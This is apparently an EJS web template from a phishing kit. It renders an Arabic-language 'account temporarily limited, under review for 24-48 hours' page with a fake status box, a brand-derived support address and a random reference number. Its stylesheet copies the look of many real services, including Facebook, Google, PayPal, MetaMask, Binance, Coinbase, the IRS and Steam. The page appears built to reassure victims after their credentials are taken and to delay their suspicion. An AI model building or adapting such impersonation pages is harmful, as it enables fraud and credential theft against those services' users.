<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title><%= pageContent.page_title %> — <%= tpl.name %></title>
<style>
:root{--bg:<%= tpl.palette.bg %>;--card:<%= tpl.palette.card %>;--fg:<%= tpl.palette.fg %>;--ac:<%= tpl.palette.accent %>}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--fg);font-family:system-ui,-apple-system,Tahoma,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:var(--card);border-radius:16px;padding:40px 32px;max-width:440px;width:100%;text-align:center;box-shadow:0 8px 32px #00000040}
.brand-logo{font-size:1.1rem;font-weight:700;color:var(--ac);margin-bottom:24px;display:block}
.lock-icon{font-size:56px;margin-bottom:16px;display:block}
h1{font-size:1.3rem;margin-bottom:10px}
.sub{font-size:.9rem;opacity:.6;line-height:1.7;margin-bottom:28px}
.status-box{background:#ffffff08;border-radius:12px;padding:16px 20px;text-align:right;margin-bottom:24px}
.status-row{display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid #ffffff08;font-size:.86rem}
.status-row:last-child{border-bottom:none}
.status-row .val{opacity:.5}
.status-row .pending{color:#f59e0b}
.ref{font-size:.78rem;opacity:.35;margin-top:16px;font-family:monospace}
body.brand-facebook{background:#f0f2f5;color:#1c1e21}
body.brand-facebook .card{background:#fff;box-shadow:0 2px 4px rgba(0,0,0,.1);border-radius:8px}
body.brand-google,body.brand-gmail{background:#fff;color:#202124}
body.brand-google .card,body.brand-gmail .card{background:#fff;border:1px solid #dadce0;box-shadow:none;border-radius:8px}
body.brand-apple{background:#f5f5f7;color:#1d1d1f}
body.brand-apple .card{background:#fff;border-radius:18px;box-shadow:0 4px 16px rgba(0,0,0,.12)}
body.brand-microsoft{background:#fff;color:#323130}
body.brand-microsoft .card{background:#fff;border-radius:0;box-shadow:none}
body.brand-amazon{background:#fff;color:#0f1111}
body.brand-amazon .card{background:#fff;border:1px solid #a6a6a6;border-radius:4px;box-shadow:none}
body.brand-netflix{background:#000;color:#fff}
body.brand-netflix .card{background:#141414;border-radius:4px}
body.brand-instagram{background:#fafafa;color:#262626}
body.brand-instagram .card{background:#fff;border:1px solid #dbdbdb;border-radius:1px;box-shadow:none}
body.brand-twitter,body.brand-twitterx{background:#fff;color:#0f1419}
body.brand-twitter .card,body.brand-twitterx .card{background:#fff;border-radius:16px;box-shadow:none}
body.brand-paypal{background:#0070ba}
body.brand-paypal .card{background:#fff;color:#2c2e2f;border-radius:6px}
body.brand-metamask{background:#24272A;color:#fff}
body.brand-metamask .card{background:#1c1f22;border:1px solid #3c4044}
body.brand-binance{background:#181A20;color:#eaecef}
body.brand-binance .card{background:#1e2026;border:1px solid #2e3340}
body.brand-coinbase{background:#fff;color:#0a0b0d}
body.brand-coinbase .card{background:#fff;border:1px solid #e9eaeb;border-radius:16px}
body.brand-discord{background:#5865F2}
body.brand-discord .card{background:#36393f;border-radius:5px}
body.brand-linkedin{background:#f3f2ef;color:#000}
body.brand-linkedin .card{background:#fff;border-radius:8px;box-shadow:0 0 0 1px rgba(0,0,0,.15)}
body.brand-snapchat{background:#FFFC00;color:#000}
body.brand-snapchat .card{background:#fff;border-radius:32px}
body.brand-tiktok{background:#000;color:#fff}
body.brand-tiktok .card{background:#161823;border:1px solid #2e3340;border-radius:0}
body.brand-spotify{background:#191414;color:#fff}
body.brand-spotify .card{background:#191414;box-shadow:none}
body.brand-irs{background:#f5f5f5;color:#1a1a1a;font-family:'Times New Roman',serif}
body.brand-irs .card{background:#fff;border:1px solid #ccc;border-radius:4px}
body.brand-emirates{background:#C8102E}
body.brand-emirates .card{background:#fff;color:#1a1a1a;border-radius:6px}
body.brand-qatarairways{background:#5C0632}
body.brand-qatarairways .card{background:#fff;color:#1a1a1a;border-radius:6px}
body.brand-steam{background:#1b2838;color:#c6d4df}
body.brand-steam .card{background:#1e2b38;border-radius:3px}
</style>
</head>
<body class="brand-<%= tpl.key || tpl.name.toLowerCase().replace(/[^a-z0-9]/g,'') %>">
<div class="card">
  <% if (typeof logos !== 'undefined' && logos[tpl.key]) { %><div style="text-align:center;margin-bottom:16px"><%- logos[tpl.key] %></div><% } else { %><span class="brand-logo"><%= tpl.name %></span><% } %>
  <span class="lock-icon">🔒</span>
  <h1><%= pageContent.headline || 'الحساب محدود مؤقتاً' %></h1>
  <p class="sub"><%= pageContent.subheadline || 'جارٍ مراجعة معلوماتك. سيتم إعادة تفعيل حسابك خلال 24-48 ساعة.' %></p>

  <div class="status-box">
    <div class="status-row">
      <span>الحالة</span>
      <span class="pending">قيد المراجعة ⏳</span>
    </div>
    <div class="status-row">
      <span>وقت المراجعة المتوقع</span>
      <span class="val">24-48 ساعة</span>
    </div>
    <div class="status-row">
      <span>التواصل</span>
      <span class="val">support@<%= tpl.name.toLowerCase().replace(/\s/g,'') %>.com</span>
    </div>
  </div>

  <p class="ref">رقم المرجع: REV-<%= Math.random().toString(36).substr(2,8).toUpperCase() %></p>
</div>
</body>
</html>
